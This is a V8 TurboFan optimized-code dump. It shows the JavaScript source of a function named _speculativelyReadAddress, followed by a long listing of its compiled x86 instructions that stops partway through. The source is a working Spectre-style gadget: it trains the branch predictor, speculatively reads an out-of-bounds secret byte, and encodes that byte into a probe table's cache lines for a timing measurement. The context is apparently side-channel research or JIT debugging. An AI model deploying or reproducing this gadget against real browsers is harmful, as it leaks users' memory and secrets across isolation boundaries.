--- Raw source ---
() {
    // run the speculative execution at least twice
    // the first run causes secret_table[fixed_index] to be loaded from RAM (cache miss)
    // this means that the speculative branch takes long to execute and thus is likely to get caught by the branch rollback
    // the second time that the speculative execution runs, secret_table[fixed_index] is already cached and therefore fast
    for (let j = 0; j < TRAINING_CONSTANT; ++j) {
        const valid_access_indicator_array = new Uint8Array(speculative_training_number * page_size);
        for (let i = 0; i < speculative_training_number; ++i) {
            const invalid_access = !((i + 1) % speculative_training_number);
            const fixed_index = address & -invalid_access;
            const fixed_page_size = page_size * invalid_access;
            // ensure evaluation before jump condition
            junk ^= invalid_access | fixed_index | fixed_page_size;
            // if (invalid_access) {
            const probe_table = new Uint8Array((1 + probe_length) * page_size);
            // }
            // load condition from RAM so speculative execution gets triggered
            if (!valid_access_indicator_array[i * page_size] && !invalid_access) {
                const secret_value = secret_table[fixed_index];
                // map valid accesses to the address (probe_tables)
                // map invalid accesses to their respective probe boxes
                junk ^= probe_table[(1 + secret_value) * fixed_page_size];
            }
            // _log(89);
            if (invalid_access && j == TRAINING_CONSTANT - 1) {
                // junk ^= probe_table[8 * page_size];
                // probe table
                probeTable(probe_table);
            }
        }
    }
}


--- Optimized code ---
optimization_id = 0
source_position = 333
kind = OPTIMIZED_FUNCTION
name = _speculativelyReadAddress
stack_slots = 29
compiler = turbofan
address = 0x172490876961

Instructions (size = 4652)
                  -- <not inlined:333> --
                  -- Prologue: check for deoptimization --
0x1724908769a0     0  488b59e0       REX.W movq rbx,[rcx-0x20]
0x1724908769a4     4  f6430f01       testb [rbx+0xf],0x1
0x1724908769a8     8  0f857285f1ff   jnz 0x17249078ef20  (CompileLazyDeoptimizedCode)    ;; code: Builtin::CompileLazyDeoptimizedCode
                  -- B0 start (construct frame) --
0x1724908769ae     e  55             push rbp
0x1724908769af     f  4889e5         REX.W movq rbp,rsp
0x1724908769b2    12  56             push rsi
0x1724908769b3    13  57             push rdi
0x1724908769b4    14  48ba0000000027000000 REX.W movq rdx,0x2700000000
0x1724908769be    1e  e8bd6ef2ff     call 0x17249079d880  (Abort)    ;; code: Builtin::Abort
0x1724908769c3    23  cc             int3l
                  -- OSR entrypoint --
0x1724908769c4    24  4883ec60       REX.W subq rsp,0x60
0x1724908769c8    28  48897580       REX.W movq [rbp-0x80],rsi
0x1724908769cc    2c  4c8b55a0       REX.W movq r10,[rbp-0x60]
0x1724908769d0    30  4c899578ffffff REX.W movq [rbp-0x88],r10
0x1724908769d7    37  660f1f840000000000 nop
                  -- B1 start (loop up to 110) --
                  -- <not inlined:748> --
0x1724908769e0    40  488b5e37       REX.W movq rbx,[rsi+0x37]
                  -- <not inlined:750> --
0x1724908769e4    44  b801000000     movl rax,0x1
0x1724908769e9    49  49395da8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),rbx
0x1724908769ed    4d  0f84c10f0000   jz 0x1724908779b4  <+0x1014>
                  -- B2 start (in loop 1) --
                  -- <not inlined:748> --
0x1724908769f3    53  488b9578ffffff REX.W movq rdx,[rbp-0x88]
0x1724908769fa    5a  f6c201         testb rdx,0x1
0x1724908769fd    5d  0f8543100000   jnz 0x172490877a46  <+0x10a6>
0x172490876a03    63  f6c301         testb rbx,0x1
0x172490876a06    66  0f853f100000   jnz 0x172490877a4b  <+0x10ab>
0x172490876a0c    6c  483bd3         REX.W cmpq rdx,rbx
0x172490876a0f    6f  0f8d84080000   jge 0x172490877299  <+0x8f9>
                  -- B3 start (in loop 1) --
                  -- <not inlined:730> --
0x172490876a15    75  493ba5f80f0000 REX.W cmpq rsp,[r13+0xff8] (root (32766))
0x172490876a1c    7c  0f8682080000   jna 0x1724908772a4  <+0x904>
                  -- B5 start (in loop 1) --
                  -- B6 start (in loop 1) --
                  -- <not inlined:821> --
0x172490876a22    82  488b4e57       REX.W movq rcx,[rsi+0x57]
                  -- <not inlined:836> --
0x172490876a26    86  49394da8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),rcx
0x172490876a2a    8a  0f845d0f0000   jz 0x17249087798d  <+0xfed>
                  -- B7 start (in loop 1) --
0x172490876a30    90  488b7e3f       REX.W movq rdi,[rsi+0x3f]
                  -- <not inlined:866> --
0x172490876a34    94  49397da8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),rdi
0x172490876a38    98  0f84210f0000   jz 0x17249087795f  <+0xfbf>
                  -- B8 start (in loop 1) --
                  -- <not inlined:864> --
0x172490876a3e    9e  f6c101         testb rcx,0x1
0x172490876a41    a1  0f8509100000   jnz 0x172490877a50  <+0x10b0>
0x172490876a47    a7  40f6c701       testb rdi,0x1
0x172490876a4b    ab  0f8504100000   jnz 0x172490877a55  <+0x10b5>
0x172490876a51    b1  48c1ef20       REX.W shrq rdi, 32
0x172490876a55    b5  48c1e920       REX.W shrq rcx, 32
0x172490876a59    b9  4c8bc1         REX.W movq r8,rcx
0x172490876a5c    bc  440fafc7       imull r8,rdi
0x172490876a60    c0  0f80f40f0000   jo 0x172490877a5a  <+0x10ba>
0x172490876a66    c6  4c898568ffffff REX.W movq [rbp-0x98],r8
0x172490876a6d    cd  4183f800       cmpl r8,0x0
0x172490876a71    d1  0f8465080000   jz 0x1724908772dc  <+0x93c>
                  -- B9 start (in loop 1) --
                  -- B11 start (in loop 1) --
                  -- <not inlined:821> --
0x172490876a77    d7  498bd8         REX.W movq rbx,r8
0x172490876a7a    da  48c1e320       REX.W shlq rbx, 32
0x172490876a7e    de  4c8be0         REX.W movq r12,rax
0x172490876a81    e1  4c8bda         REX.W movq r11,rdx
0x172490876a84    e4  48b8e9276158ec2a0000 REX.W movq rax,0x2aec586127e9    ;; object: 0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>
0x172490876a8e    ee  4c8bce         REX.W movq r9,rsi
0x172490876a91    f1  488bcb         REX.W movq rcx,rbx
0x172490876a94    f4  498b55a0       REX.W movq rdx,[r13-0x60] (root (0x3f3b16e025b1 <undefined>))
0x172490876a98    f8  488bd8         REX.W movq rbx,rax
0x172490876a9b    fb  4c8bf0         REX.W movq r14,rax
0x172490876a9e    fe  488bfa         REX.W movq rdi,rdx
0x172490876aa1   101  e8ba4ef5ff     call 0x1724907cb960  (CreateTypedArray)    ;; code: Builtin::CreateTypedArray
                  -- <not inlined:904> --
0x172490876aa6   106  488b7580       REX.W movq rsi,[rbp-0x80]
0x172490876aaa   10a  488b5e57       REX.W movq rbx,[rsi+0x57]
                  -- <not inlined:906> --
0x172490876aae   10e  48898568ffffff REX.W movq [rbp-0x98],rax
0x172490876ab5   115  49395da8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),rbx
0x172490876ab9   119  0f84700e0000   jz 0x17249087792f  <+0xf8f>
                  -- B12 start (in loop 1) --
                  -- <not inlined:904> --
0x172490876abf   11f  f6c301         testb rbx,0x1
0x172490876ac2   122  0f859c0f0000   jnz 0x172490877a64  <+0x10c4>
0x172490876ac8   128  4883fb00       REX.W cmpq rbx,0x0
0x172490876acc   12c  0f8ea0070000   jle 0x172490877272  <+0x8d2>
                  -- B13 start (in loop 1) --
                  -- B14 start (in loop 1) --
                  -- <not inlined:886> --
0x172490876ad2   132  493ba5f80f0000 REX.W cmpq rsp,[r13+0xff8] (root (32766))
0x172490876ad9   139  0f862b080000   jna 0x17249087730a  <+0x96a>
                  -- B16 start (in loop 1) --
                  -- B17 start (in loop 1) --
                  -- <not inlined:987> --
0x172490876adf   13f  488bc3         REX.W movq rax,rbx
0x172490876ae2   142  48c1e820       REX.W shrq rax, 32
0x172490876ae6   146  83f800         cmpl rax,0x0
0x172490876ae9   149  0f8e44080000   jle 0x172490877333  <+0x993>
                  -- B18 start (in loop 1) --
0x172490876aef   14f  488bc8         REX.W movq rcx,rax
                  -- B20 start (in loop 1) --
0x172490876af2   152  8d41ff         leal rax,[rcx-0x1]
0x172490876af5   155  85c8           testl rcx,rax
0x172490876af7   157  0f840e000000   jz 0x172490876b0b  <+0x16b>
                  -- B21 start (in loop 1) --
0x172490876afd   15d  b801000000     movl rax,0x1
0x172490876b02   162  33d2           xorl rdx,rdx
0x172490876b04   164  f7f1           divl rcx
0x172490876b06   166  e906000000     jmp 0x172490876b11  <+0x171>
                  -- B22 start (in loop 1) --
0x172490876b0b   16b  83e001         andl rax,0x1
0x172490876b0e   16e  488bd0         REX.W movq rdx,rax
                  -- B23 start (in loop 1) --
0x172490876b11   171  83fa00         cmpl rdx,0x0
0x172490876b14   174  0f95c0         setnzl al
0x172490876b17   177  0fb6c0         movzxbl rax,rax
0x172490876b1a   17a  83f800         cmpl rax,0x0
0x172490876b1d   17d  0f94c2         setzl dl
0x172490876b20   180  0fb6d2         movzxbl rdx,rdx
                  -- <not inlined:1051> --
0x172490876b23   183  488b4e47       REX.W movq rcx,[rsi+0x47]
0x172490876b27   187  48898540ffffff REX.W movq [rbp-0xc0],rax
0x172490876b2e   18e  48899560ffffff REX.W movq [rbp-0xa0],rdx
0x172490876b35   195  49394da8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),rcx
0x172490876b39   199  0f84b20d0000   jz 0x1724908778f1  <+0xf51>
                  -- B24 start (in loop 1) --
                  -- <not inlined:1059> --
0x172490876b3f   19f  f6c101         testb rcx,0x1
0x172490876b42   1a2  0f8429000000   jz 0x172490876b71  <+0x1d1>
                  -- B25 start (in loop 1) --
0x172490876b48   1a8  488b79ff       REX.W movq rdi,[rcx-0x1]
0x172490876b4c   1ac  49397d48       REX.W cmpq [r13+0x48] (root (0x3f3b16e02641 <Map[16]>)),rdi
0x172490876b50   1b0  0f85130f0000   jnz 0x172490877a69  <+0x10c9>
0x172490876b56   1b6  c5fb104107     vmovsd xmm0,[rcx+0x7]
0x172490876b5b   1bb  c4e1fb2cc8     vcvttsd2siq rcx,xmm0
0x172490876b60   1c0  4883f901       REX.W cmpq rcx,0x1
0x172490876b64   1c4  0f80c10e0000   jo 0x172490877a2b  <+0x108b>
0x172490876b6a   1ca  8bc9           movl rcx,rcx
0x172490876b6c   1cc  e904000000     jmp 0x172490876b75  <+0x1d5>
                  -- B26 start (in loop 1) --
0x172490876b71   1d1  48c1e920       REX.W shrq rcx, 32
                  -- B27 start (in loop 1) --
                  -- <not inlined:1061> --
0x172490876b75   1d5  488bfa         REX.W movq rdi,rdx
0x172490876b78   1d8  f7df           negl rdi
                  -- <not inlined:1059> --
0x172490876b7a   1da  23f9           andl rdi,rcx
                  -- <not inlined:1114> --
0x172490876b7c   1dc  488b4e3f       REX.W movq rcx,[rsi+0x3f]
0x172490876b80   1e0  4889bd58ffffff REX.W movq [rbp-0xa8],rdi
0x172490876b87   1e7  49394da8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),rcx
0x172490876b8b   1eb  0f841d0d0000   jz 0x1724908778ae  <+0xf0e>
                  -- B28 start (in loop 1) --
                  -- <not inlined:1124> --
0x172490876b91   1f1  f6c101         testb rcx,0x1
0x172490876b94   1f4  410f94c0       setzl r8l
0x172490876b98   1f8  450fb6c0       movzxbl r8,r8
0x172490876b9c   1fc  4183f800       cmpl r8,0x0
0x172490876ba0   200  0f8525000000   jnz 0x172490876bcb  <+0x22b>
                  -- B29 start (in loop 1) --
0x172490876ba6   206  4c8b49ff       REX.W movq r9,[rcx-0x1]
0x172490876baa   20a  4d394d48       REX.W cmpq [r13+0x48] (root (0x3f3b16e02641 <Map[16]>)),r9
0x172490876bae   20e  0f840d000000   jz 0x172490876bc1  <+0x221>
                  -- B30 start (in loop 1) --
0x172490876bb4   214  664181790b8300 cmpw [r9+0xb],0x83
0x172490876bbb   21b  0f85ad0e0000   jnz 0x172490877a6e  <+0x10ce>
                  -- B31 start (in loop 1) --
                  -- B32 start (in loop 1) --
0x172490876bc1   221  c5fb104107     vmovsd xmm0,[rcx+0x7]
0x172490876bc6   226  e910000000     jmp 0x172490876bdb  <+0x23b>
                  -- B33 start (in loop 1) --
0x172490876bcb   22b  4c8bc9         REX.W movq r9,rcx
0x172490876bce   22e  49c1e920       REX.W shrq r9, 32
0x172490876bd2   232  c5f957c0       vxorpd xmm0,xmm0,xmm0
0x172490876bd6   236  c4c17b2ac1     vcvtlsi2sd xmm0,xmm0,r9
                  -- B34 start (in loop 1) --
0x172490876bdb   23b  448bd2         movl r10,rdx
0x172490876bde   23e  c5f157c9       vxorpd xmm1,xmm1,xmm1
0x172490876be2   242  c4c1f32aca     vcvtqsi2sd xmm1,xmm1,r10
0x172490876be7   247  c5fb59c1       vmulsd xmm0,xmm0,xmm1
                  -- <not inlined:1209> --
0x172490876beb   24b  4c8b4e2f       REX.W movq r9,[rsi+0x2f]
0x172490876bef   24f  c5fb118550ffffff vmovsd [rbp-0xb0],xmm0
0x172490876bf7   257  4d394da8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),r9
0x172490876bfb   25b  0f845d0c0000   jz 0x17249087785e  <+0xebe>
                  -- B35 start (in loop 1) --
                  -- <not inlined:1246> --
0x172490876c01   261  c461fb2cd8     vcvttsd2siq r11,xmm0
0x172490876c06   266  4983fb01       REX.W cmpq r11,0x1
0x172490876c0a   26a  0f80000e0000   jo 0x172490877a10  <+0x1070>
0x172490876c10   270  458bdb         movl r11,r11
                  -- <not inlined:1232> --
0x172490876c13   273  4c8be2         REX.W movq r12,rdx
0x172490876c16   276  440be7         orl r12,rdi
                  -- <not inlined:1246> --
0x172490876c19   279  4509e3         orl r11,r12
0x172490876c1c   27c  4d8be1         REX.W movq r12,r9
0x172490876c1f   27f  49c1ec20       REX.W shrq r12, 32
0x172490876c23   283  4531e3         xorl r11,r12
0x172490876c26   286  41f6c101       testb r9,0x1
0x172490876c2a   28a  0f85430e0000   jnz 0x172490877a73  <+0x10d3>
                  -- <not inlined:1214> --
0x172490876c30   290  49c1e320       REX.W shlq r11, 32
0x172490876c34   294  4c895e2f       REX.W movq [rsi+0x2f],r11
                  -- <not inlined:1334> --
0x172490876c38   298  488b5e4f       REX.W movq rbx,[rsi+0x4f]
                  -- <not inlined:1354> --
0x172490876c3c   29c  49395da8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),rbx
0x172490876c40   2a0  0f84d00b0000   jz 0x172490877816  <+0xe76>
                  -- B36 start (in loop 1) --
                  -- <not inlined:1352> --
0x172490876c46   2a6  f6c301         testb rbx,0x1
0x172490876c49   2a9  0f85290e0000   jnz 0x172490877a78  <+0x10d8>
0x172490876c4f   2af  48c1eb20       REX.W shrq rbx, 32
0x172490876c53   2b3  83c301         addl rbx,0x1
0x172490876c56   2b6  0f80210e0000   jo 0x172490877a7d  <+0x10dd>
                  -- <not inlined:1368> --
0x172490876c5c   2bc  4183f800       cmpl r8,0x0
0x172490876c60   2c0  0f841c0e0000   jz 0x172490877a82  <+0x10e2>
                  -- <not inlined:1124> --
0x172490876c66   2c6  48c1e920       REX.W shrq rcx, 32
                  -- <not inlined:1368> --
0x172490876c6a   2ca  4c8bc3         REX.W movq r8,rbx
0x172490876c6d   2cd  440fafc1       imull r8,rcx
0x172490876c71   2d1  0f80100e0000   jo 0x172490877a87  <+0x10e7>
0x172490876c77   2d7  4c898570ffffff REX.W movq [rbp-0x90],r8
0x172490876c7e   2de  4183f800       cmpl r8,0x0
0x172490876c82   2e2  0f84d3060000   jz 0x17249087735b  <+0x9bb>
                  -- B37 start (in loop 1) --
                  -- B39 start (in loop 1) --
                  -- <not inlined:1334> --
0x172490876c88   2e8  498bd8         REX.W movq rbx,r8
0x172490876c8b   2eb  48c1e320       REX.W shlq rbx, 32
0x172490876c8f   2ef  4c8bf0         REX.W movq r14,rax
0x172490876c92   2f2  48b8e9276158ec2a0000 REX.W movq rax,0x2aec586127e9    ;; object: 0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>
0x172490876c9c   2fc  4c8be7         REX.W movq r12,rdi
0x172490876c9f   2ff  488bcb         REX.W movq rcx,rbx
0x172490876ca2   302  4c8bda         REX.W movq r11,rdx
0x172490876ca5   305  498b55a0       REX.W movq rdx,[r13-0x60] (root (0x3f3b16e025b1 <undefined>))
0x172490876ca9   309  4c8bce         REX.W movq r9,rsi
0x172490876cac   30c  488bd8         REX.W movq rbx,rax
0x172490876caf   30f  488bfa         REX.W movq rdi,rdx
0x172490876cb2   312  e8a94cf5ff     call 0x1724907cb960  (CreateTypedArray)    ;; code: Builtin::CreateTypedArray
                  -- <not inlined:1490> --
0x172490876cb7   317  488b7580       REX.W movq rsi,[rbp-0x80]
0x172490876cbb   31b  488b5e3f       REX.W movq rbx,[rsi+0x3f]
                  -- <not inlined:1528> --
0x172490876cbf   31f  49395da8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),rbx
0x172490876cc3   323  0f84e80a0000   jz 0x1724908777b1  <+0xe11>
                  -- B40 start (in loop 1) --
                  -- <not inlined:1526> --
0x172490876cc9   329  f6c301         testb rbx,0x1
0x172490876ccc   32c  0f85bf0d0000   jnz 0x172490877a91  <+0x10f1>
                  -- <not inlined:1523> --
0x172490876cd2   332  488b8d68ffffff REX.W movq rcx,[rbp-0x98]
0x172490876cd9   339  48bf8147482509060000 REX.W movq rdi,0x60925484781    ;; object: 0x060925484781 <Map(UINT8_ELEMENTS)>
0x172490876ce3   343  483979ff       REX.W cmpq [rcx-0x1],rdi
0x172490876ce7   347  0f85a90d0000   jnz 0x172490877a96  <+0x10f6>
0x172490876ced   34d  488b5117       REX.W movq rdx,[rcx+0x17]
0x172490876cf1   351  4c8b410f       REX.W movq r8,[rcx+0xf]
0x172490876cf5   355  448b4933       movl r9,[rcx+0x33]
0x172490876cf9   359  4d8b4017       REX.W movq r8,[r8+0x17]
0x172490876cfd   35d  4183f900       cmpl r9,0x0
0x172490876d01   361  0f86940d0000   jna 0x172490877a9b  <+0x10fb>
0x172490876d07   367  410fb610       movzxbl rdx,[r8]
0x172490876d0b   36b  83fa00         cmpl rdx,0x0
0x172490876d0e   36e  0f85e2000000   jnz 0x172490876df6  <+0x456>
                  -- B41 start (in loop 1) --
                  -- B42 start (in loop 1) --
                  -- <not inlined:1543> --
0x172490876d14   374  83bd40ffffff00 cmpl [rbp-0xc0],0x0
0x172490876d1b   37b  0f84d5000000   jz 0x172490876df6  <+0x456>
                  -- B43 start (in loop 1) --
                  -- B44 start (in loop 1) --
                  -- <not inlined:1598> --
0x172490876d21   381  4c8b465f       REX.W movq r8,[rsi+0x5f]
0x172490876d25   385  4d3945a8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),r8
0x172490876d29   389  0f841f0a0000   jz 0x17249087774e  <+0xdae>
                  -- B45 start (in loop 1) --
                  -- <not inlined:1610> --
0x172490876d2f   38f  41f6c001       testb r8,0x1
0x172490876d33   393  0f84670d0000   jz 0x172490877aa0  <+0x1100>
0x172490876d39   399  493978ff       REX.W cmpq [r8-0x1],rdi
0x172490876d3d   39d  0f85620d0000   jnz 0x172490877aa5  <+0x1105>
0x172490876d43   3a3  498b5017       REX.W movq rdx,[r8+0x17]
0x172490876d47   3a7  4d8b480f       REX.W movq r9,[r8+0xf]
0x172490876d4b   3ab  458b4033       movl r8,[r8+0x33]
0x172490876d4f   3af  4d8b4917       REX.W movq r9,[r9+0x17]
0x172490876d53   3b3  4c8b9d58ffffff REX.W movq r11,[rbp-0xa8]
0x172490876d5a   3ba  453bd8         cmpl r11,r8
0x172490876d5d   3bd  0f83470d0000   jnc 0x172490877aaa  <+0x110a>
0x172490876d63   3c3  470fb60419     movzxbl r8,[r9+r11*1]
                  -- <not inlined:1781> --
0x172490876d68   3c8  4c8b4e2f       REX.W movq r9,[rsi+0x2f]
0x172490876d6c   3cc  4d394da8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),r9
0x172490876d70   3d0  0f8481090000   jz 0x1724908776f7  <+0xd57>
                  -- B46 start (in loop 1) --
                  -- <not inlined:1820> --
0x172490876d76   3d6  c5fb2c9550ffffff vcvttsd2si rdx,[rbp-0xb0]
0x172490876d7e   3de  c5f957c0       vxorpd xmm0,xmm0,xmm0
0x172490876d82   3e2  c5fb2ac2       vcvtlsi2sd xmm0,xmm0,rdx
0x172490876d86   3e6  c5f92e8550ffffff vucomisd xmm0,[rbp-0xb0]
0x172490876d8e   3ee  0f8a1b0d0000   jpe 0x172490877aaf  <+0x110f>
0x172490876d94   3f4  0f85150d0000   jnz 0x172490877aaf  <+0x110f>
0x172490876d9a   3fa  83fa00         cmpl rdx,0x0
0x172490876d9d   3fd  0f84da050000   jz 0x17249087737d  <+0x9dd>
                  -- B47 start (in loop 1) --
                  -- B49 start (in loop 1) --
                  -- <not inlined:1804> --
0x172490876da3   403  4183c001       addl r8,0x1
                  -- <not inlined:1820> --
0x172490876da7   407  410fafd0       imull rdx,r8
0x172490876dab   40b  0f80030d0000   jo 0x172490877ab4  <+0x1114>
                  -- <not inlined:1800> --
0x172490876db1   411  483978ff       REX.W cmpq [rax-0x1],rdi
0x172490876db5   415  0f85fe0c0000   jnz 0x172490877ab9  <+0x1119>
0x172490876dbb   41b  4c8b4017       REX.W movq r8,[rax+0x17]
0x172490876dbf   41f  4c8b600f       REX.W movq r12,[rax+0xf]
0x172490876dc3   423  448b7033       movl r14,[rax+0x33]
0x172490876dc7   427  4d8b642417     REX.W movq r12,[r12+0x17]
0x172490876dcc   42c  413bd6         cmpl rdx,r14
0x172490876dcf   42f  0f83e90c0000   jnc 0x172490877abe  <+0x111e>
0x172490876dd5   435  410fb61414     movzxbl rdx,[r12+rdx*1]
0x172490876dda   43a  4d8bc1         REX.W movq r8,r9
0x172490876ddd   43d  49c1e820       REX.W shrq r8, 32
0x172490876de1   441  4133d0         xorl rdx,r8
0x172490876de4   444  41f6c101       testb r9,0x1
0x172490876de8   448  0f85d50c0000   jnz 0x172490877ac3  <+0x1123>
                  -- <not inlined:1786> --
0x172490876dee   44e  48c1e220       REX.W shlq rdx, 32
0x172490876df2   452  4889562f       REX.W movq [rsi+0x2f],rdx
                  -- B50 start (in loop 1) --
                  -- <not inlined:1891> --
0x172490876df6   456  83bd40ffffff00 cmpl [rbp-0xc0],0x0
0x172490876dfd   45d  0f8550000000   jnz 0x172490876e53  <+0x4b3>
                  -- B51 start (in loop 1) --
0x172490876e03   463  488b5e37       REX.W movq rbx,[rsi+0x37]
                  -- <not inlined:1918> --
0x172490876e07   467  49395da8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),rbx
0x172490876e0b   46b  0f8449070000   jz 0x17249087755a  <+0xbba>
                  -- B52 start (in loop 1) --
0x172490876e11   471  488b9578ffffff REX.W movq rdx,[rbp-0x88]
0x172490876e18   478  48c1ea20       REX.W shrq rdx, 32
                  -- <not inlined:1936> --
0x172490876e1c   47c  f6c301         testb rbx,0x1
0x172490876e1f   47f  0f85a30c0000   jnz 0x172490877ac8  <+0x1128>
0x172490876e25   485  4c8bc3         REX.W movq r8,rbx
0x172490876e28   488  49c1e820       REX.W shrq r8, 32
0x172490876e2c   48c  4183e801       subl r8,0x1
0x172490876e30   490  0f80970c0000   jo 0x172490877acd  <+0x112d>
                  -- <not inlined:1915> --
0x172490876e36   496  443bc2         cmpl r8,rdx
0x172490876e39   499  0f8514000000   jnz 0x172490876e53  <+0x4b3>
                  -- B53 start (in loop 1) --
                  -- B54 start (in loop 1) --
                  -- <not inlined:2045> --
0x172490876e3f   49f  48baf95ad3aa622d0000 REX.W movq rdx,0x2d62aad35af9    ;; object: 0x2d62aad35af9 <JSFunction probeTable (sfi = 0x39d88e2585a9)>
0x172490876e49   4a9  48395667       REX.W cmpq [rsi+0x67],rdx
0x172490876e4d   4ad  0f857f0c0000   jnz 0x172490877ad2  <+0x1132>
                  -- B55 start (in loop 1) --
                  -- B56 start (in loop 1) --
0x172490876e53   4b3  48c78560ffffff01000000 REX.W movq [rbp-0xa0],0x1
0x172490876e5e   4be  6690           nop
                  -- B57 start (loop up to 108) (in loop 1) --
                  -- <not inlined:904> --
0x172490876e60   4c0  488b5e57       REX.W movq rbx,[rsi+0x57]
                  -- <not inlined:906> --
0x172490876e64   4c4  48899d70ffffff REX.W movq [rbp-0x90],rbx
0x172490876e6b   4cb  49395da8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),rbx
0x172490876e6f   4cf  0f8463080000   jz 0x1724908776d8  <+0xd38>
                  -- B58 start (in loop 57) --
                  -- <not inlined:904> --
0x172490876e75   4d5  488bc3         REX.W movq rax,rbx
0x172490876e78   4d8  48c1e820       REX.W shrq rax, 32
0x172490876e7c   4dc  f6c301         testb rbx,0x1
0x172490876e7f   4df  0f85520c0000   jnz 0x172490877ad7  <+0x1137>
0x172490876e85   4e5  4c8b8560ffffff REX.W movq r8,[rbp-0xa0]
0x172490876e8c   4ec  443bc0         cmpl r8,rax
0x172490876e8f   4ef  0f8ddd030000   jge 0x172490877272  <+0x8d2>
                  -- B59 start (in loop 57) --
                  -- <not inlined:886> --
0x172490876e95   4f5  493ba5f80f0000 REX.W cmpq rsp,[r13+0xff8] (root (32766))
0x172490876e9c   4fc  0f8635050000   jna 0x1724908773d7  <+0xa37>
                  -- B61 start (in loop 57) --
                  -- B62 start (in loop 57) --
                  -- <not inlined:982> --
0x172490876ea2   502  498bd0         REX.W movq rdx,r8
0x172490876ea5   505  83c201         addl rdx,0x1
0x172490876ea8   508  0f802e0c0000   jo 0x172490877adc  <+0x113c>
                  -- <not inlined:987> --
0x172490876eae   50e  83f800         cmpl rax,0x0
0x172490876eb1   511  0f8e68050000   jle 0x17249087741f  <+0xa7f>
                  -- B63 start (in loop 57) --
                  -- B65 start (in loop 57) --
0x172490876eb7   517  4c8bc8         REX.W movq r9,rax
0x172490876eba   51a  418d41ff       leal rax,[r9-0x1]
                  -- <not inlined:982> --
0x172490876ebe   51e  4c8bda         REX.W movq r11,rdx
                  -- <not inlined:987> --
0x172490876ec1   521  4485c8         testl r9,rax
0x172490876ec4   524  0f94c2         setzl dl
0x172490876ec7   527  0fb6d2         movzxbl rdx,rdx
0x172490876eca   52a  4c899d28ffffff REX.W movq [rbp-0xd8],r11
0x172490876ed1   531  4183fb00       cmpl r11,0x0
0x172490876ed5   535  0f8c89050000   jl 0x172490877464  <+0xac4>
                  -- B66 start (in loop 57) --
0x172490876edb   53b  83fa00         cmpl rdx,0x0
0x172490876ede   53e  0f850d000000   jnz 0x172490876ef1  <+0x551>
                  -- B67 start (in loop 57) --
0x172490876ee4   544  498bc3         REX.W movq rax,r11
0x172490876ee7   547  33d2           xorl rdx,rdx
0x172490876ee9   549  41f7f1         divl r9
0x172490876eec   54c  e905000000     jmp 0x172490876ef6  <+0x556>
                  -- B68 start (in loop 57) --
0x172490876ef1   551  498bd3         REX.W movq rdx,r11
0x172490876ef4   554  23d0           andl rdx,rax
                  -- B69 start (in loop 57) --
                  -- B74 start (in loop 57) --
0x172490876ef6   556  83fa00         cmpl rdx,0x0
0x172490876ef9   559  0f95c0         setnzl al
0x172490876efc   55c  0fb6c0         movzxbl rax,rax
0x172490876eff   55f  83f800         cmpl rax,0x0
0x172490876f02   562  0f94c2         setzl dl
0x172490876f05   565  0fb6d2         movzxbl rdx,rdx
                  -- <not inlined:1051> --
0x172490876f08   568  4c8b4e47       REX.W movq r9,[rsi+0x47]
0x172490876f0c   56c  48898538ffffff REX.W movq [rbp-0xc8],rax
0x172490876f13   573  48899558ffffff REX.W movq [rbp-0xa8],rdx
0x172490876f1a   57a  4d394da8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),r9
0x172490876f1e   57e  0f849a070000   jz 0x1724908776be  <+0xd1e>
                  -- B75 start (in loop 57) --
                  -- <not inlined:1059> --
0x172490876f24   584  41f6c101       testb r9,0x1
0x172490876f28   588  0f842b000000   jz 0x172490876f59  <+0x5b9>
                  -- B76 start (in loop 57) --
0x172490876f2e   58e  4d8b61ff       REX.W movq r12,[r9-0x1]
0x172490876f32   592  4d396548       REX.W cmpq [r13+0x48] (root (0x3f3b16e02641 <Map[16]>)),r12
0x172490876f36   596  0f85a50b0000   jnz 0x172490877ae1  <+0x1141>
0x172490876f3c   59c  c4c17b104107   vmovsd xmm0,[r9+0x7]
0x172490876f42   5a2  c461fb2cc8     vcvttsd2siq r9,xmm0
0x172490876f47   5a7  4983f901       REX.W cmpq r9,0x1
0x172490876f4b   5ab  0f80a40a0000   jo 0x1724908779f5  <+0x1055>
0x172490876f51   5b1  458bc9         movl r9,r9
0x172490876f54   5b4  e904000000     jmp 0x172490876f5d  <+0x5bd>
                  -- B77 start (in loop 57) --
0x172490876f59   5b9  49c1e920       REX.W shrq r9, 32
                  -- B78 start (in loop 57) --
                  -- <not inlined:1061> --
0x172490876f5d   5bd  4c8be2         REX.W movq r12,rdx
0x172490876f60   5c0  41f7dc         negl r12
                  -- <not inlined:1059> --
0x172490876f63   5c3  4523e1         andl r12,r9
                  -- <not inlined:1114> --
0x172490876f66   5c6  4c8b4e3f       REX.W movq r9,[rsi+0x3f]
0x172490876f6a   5ca  4c89a548ffffff REX.W movq [rbp-0xb8],r12
0x172490876f71   5d1  4c898d50ffffff REX.W movq [rbp-0xb0],r9
0x172490876f78   5d8  4d394da8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),r9
0x172490876f7c   5dc  0f841f070000   jz 0x1724908776a1  <+0xd01>
                  -- B79 start (in loop 57) --
                  -- <not inlined:1124> --
0x172490876f82   5e2  41f6c101       testb r9,0x1
0x172490876f86   5e6  410f94c6       setzl r14l
0x172490876f8a   5ea  450fb6f6       movzxbl r14,r14
0x172490876f8e   5ee  4183fe00       cmpl r14,0x0
